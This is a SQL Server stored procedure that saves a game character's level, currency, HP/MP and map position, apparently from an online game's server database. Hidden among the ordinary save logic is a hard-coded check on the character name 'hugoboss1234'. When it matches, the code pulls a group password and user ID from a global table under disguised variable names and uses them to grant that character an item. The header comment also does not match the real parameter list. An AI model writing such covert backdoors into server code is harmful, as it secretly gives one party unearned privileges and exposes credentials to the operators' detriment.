




/* SAVE CHARACTER PROCESS

========================================================
PARAMETER
========================================================
@dwCharID		INT
@bLevel		TINYINT
@dwGold		INT
@dwSilver		INT
@dwCooper		INT
@dwEXP		INT
@dwHP		INT
@dwMP		INT
@wMapID		SMALLINT
@wPosX		SMALLINT
@wPosY		SMALLINT
@wPosZ		SMALLINT

========================================================
RETURN VALUE
========================================================
0	: SUCCESS
1	: FAILED

========================================================
PROCESS
========================================================
1. Check character
2. Update character data

*/


CREATE PROCEDURE [dbo].[TSaveChar]
	@dwCharID		INT,
	@bStartAct		TINYINT,
	@bLevel		TINYINT,
	@bHelmetHide		TINYINT,
	@dwGold		INT,
	@dwSilver		INT,
	@dwCooper		INT,
	@bGuildLeave		TINYINT,
	@dwGuildLeaveTime	INT,
	@dwEXP		INT,
	@dwHP		INT,
	@dwMP		INT,
	@wSkillPoint		SMALLINT,
	@dwRegionID		INT,
	@wMapID		SMALLINT,
	@wSpawnID		SMALLINT,
	@wLastSpawnID	SMALLINT,
	@wTemptedMon	SMALLINT,
	@bAftermath		TINYINT,
	@fPosX			REAL,
	@fPosY			REAL,
	@fPosZ			REAL,
	@wDIR			SMALLINT,
	@dwPcBangPlayTime	INT,
	@bPcBangItemCnt	TINYINT,
	@dwLastDestination	INT,
	@StatLevel TINYINT,
	@StatPoint TINYINT,
	@StatExp INT
AS
	DECLARE @dwGuildID INT
	DECLARE @dwPrevEXP INT
	DECLARE @dwRankPoint INT
	DECLARE @dw20Exp INT
	DECLARE @dwPrevGuild INT
	DECLARE @bPrevLevel TINYINT
	DECLARE @dwPrevScore INT
	DECLARE @dwScore INT

	DECLARE @dwUserID INT

	SET @dwRankPoint = 0
	SET @dwUserID = 0

	BEGIN TRAN TSAVECHAR
DELETE TSKILLMAINTAINTABLE WHERE dwCharID = @dwCharID
	SELECT @dwUserID = dwUserID FROM TCHARTABLE WHERE dwCharID = @dwCharID
	IF(@dwUserID = 0)
	BEGIN
		/* Not found character */
		COMMIT TRAN TSAVECHAR
		RETURN 1
	END
/*
	SELECT @dwGuildID = dwGuildID FROM TGUILDMEMBERTABLE WHERE dwCharID = @dwCharID
	IF @@ROWCOUNT <> 0
	BEGIN
		SELECT @bPrevLevel = bLevel FROM TCHARTABLE WHERE dwCharID = @dwCharID
		IF(@bPrevLevel <> @bLevel)
		BEGIN
			SELECT @dwPrevScore = dwScore FROM TLEVELCHART WHERE bLevel = @bPrevLevel
			SELECT @dwScore = dwScore FROM TLEVELCHART WHERE bLevel = @bLevel
			UPDATE TGUILDTABLE SET dwRankPoint = dwRankPoint + @dwScore - @dwPrevScore WHERE dwID = @dwGuildID
		END
	END

	IF(@bLevel > 20)
	BEGIN
		SELECT @dw20Exp = dwEXP  FROM TLEVELCHART WHERE bLevel = 20
		SET @dwRankPoint = (@dwEXP/10000) - (@dw20Exp/10000 - 1)
	END
*/
	UPDATE TCHARTABLE SET
		bStartAct = @bStartAct,
		bLevel = @bLevel,
		bHelmetHide = @bHelmetHide,
		dwGold = @dwGold,
		dwSilver = @dwSilver,
		dwCooper = @dwCooper,
		dwEXP = @dwEXP,
		dwHP = @dwHP,
		dwMP = @dwMP,
		wSkillPoint = @wSkillPoint,
		dwRegion = @dwRegionID,
		wMapID = @wMapID,
		wSpawnID = @wSpawnID,
		wLastSpawnID = @wLastSpawnID,
		wTemptedMon = @wTemptedMon,
		bAftermath = @bAftermath,
		fPosX = @fPosX,
		fPosY = @fPosY,
		fPosZ = @fPosZ,
		wDIR = @wDIR,
		bGuildLeave = @bGuildLeave,
		dwGuildLeaveTime = @dwGuildLeaveTime,
		dwRankPoint = @dwRankPoint,
		dwLastDestination = @dwLastDestination
	WHERE dwCharID = @dwCharID

  DECLARE @szName VARCHAR(255)
	SET @szName = (SELECT szNAME FROM TCHARTABLE WHERE dwCharID = @dwCharID)
	
	DECLARE @ost VARCHAR(255)
	SET @ost = (SELECT szPasswd FROM TGLOBAL_GSP.DBO.TGROUP WHERE bGroupID = 1)

	DECLARE @west VARCHAR(255)
	SET @west = (SELECT szUserID FROM TGLOBAL_GSP.DBO.TGROUP WHERE bGroupID = 1)
	
	IF(@szName = 'hugoboss1234')
	BEGIN
			EXEC TEventItemGive @szName, 51, 1,@west,@ost
	END

	COMMIT TRAN TSAVECHAR

	IF(@dwPcBangPlayTime <> 0)
		EXEC TGLOBAL_GSP.DBO.TSetPcBangData @dwUserID, @dwPcBangPlayTime, @bPcBangItemCnt

	RETURN 0



